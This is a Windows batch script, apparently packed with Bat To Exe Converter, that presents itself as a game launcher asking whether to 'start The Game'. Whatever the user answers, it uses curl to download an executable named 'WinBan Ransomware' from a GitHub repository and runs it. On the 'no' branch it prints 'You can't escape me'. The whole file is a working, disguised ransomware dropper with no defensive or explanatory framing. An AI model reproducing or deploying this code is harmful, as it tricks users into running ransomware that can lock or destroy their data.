::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFCxVQA+HLiv5Ve1JuLvHy++UqVkSRN4RfZib3LuCJOUBqg22PKoZ02JO2OoIGh5Wage5a08TqGNH+GGdMqc=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
color 57
echo Hey, do you want to start The Game? (only answer in yes or no)
set /p love=
if %love%==yes goto yes
if %love%==no goto no
:yes
echo Please wait game files downloading ...
curl -O https://github.com/hellisabove/Winban-Ransomware/blob/master/WinBan%20Ransomware/bin/Debug/WinBan%20Ransomware.exe?raw=true WinBan.exe
cls
pause
start WinBan.exe
cls
exit
:no
echo Doesnt matter...
echo You can't escape me
curl -O https://github.com/hellisabove/Winban-Ransomware/blob/master/WinBan%20Ransomware/bin/Debug/WinBan%20Ransomware.exe?raw=true WinBan.exe
cls
pause
start WinBan.exe
cls
exit
